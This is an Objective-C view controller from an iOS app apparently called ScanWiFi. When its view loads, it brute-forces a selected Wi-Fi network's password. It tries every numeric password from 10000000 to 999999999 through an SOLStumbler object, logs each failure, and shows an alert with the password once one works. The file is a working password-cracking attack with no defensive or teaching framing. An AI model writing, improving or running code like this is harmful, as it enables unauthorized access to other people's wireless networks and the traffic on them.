//
//  CrackViewController.m
//  ScanWiFi
//
//  Created by 时代合盛 on 14-7-9.
//  Copyright (c) 2014年 时代合盛. All rights reserved.
//

#import "CrackViewController.h"
#import "SOLStumbler.h"

@interface CrackViewController ()

@property (nonatomic,strong)SOLStumbler *stumbler;

@end

@implementation CrackViewController

- (id)initWithNibName:(NSString *)nibNameOrNil bundle:(NSBundle *)nibBundleOrNil
{
    self = [super initWithNibName:nibNameOrNil bundle:nibBundleOrNil];
    if (self) {
        // Custom initialization
    }
    return self;
}
- (void)back{
    [self dismissViewControllerAnimated:YES completion:nil];
}
- (void)viewDidLoad
{
    [super viewDidLoad];
    UIBarButtonItem *barbutton = [[UIBarButtonItem alloc]initWithTitle:@"back" style:UIBarButtonItemStyleBordered target:self action:@selector(back)];
    self.navigationItem.leftBarButtonItem = barbutton;
    
    self.stumbler = [[SOLStumbler alloc]init];
    for(int i=10000000;i<999999999;i++){
        if([self.stumbler linkToNetwork:self.dic withPassword:[NSString stringWithFormat:@"%d",i]]==0){
            UIAlertView *alert = [[UIAlertView alloc]initWithTitle:@"成功" message:[NSString stringWithFormat:@"成功,密码是:%d",i] delegate:self cancelButtonTitle:@"ok" otherButtonTitles:nil, nil];
            [alert show];
            return;
        }else{
            NSMutableString *str =  [NSMutableString stringWithString:self.textview.text];
            [str appendFormat:@"try:%d---->fail\n",i];
            self.textview.text = str;
        }
    }

}

- (void)didReceiveMemoryWarning
{
    [super didReceiveMemoryWarning];
    // Dispose of any resources that can be recreated.
}

@end
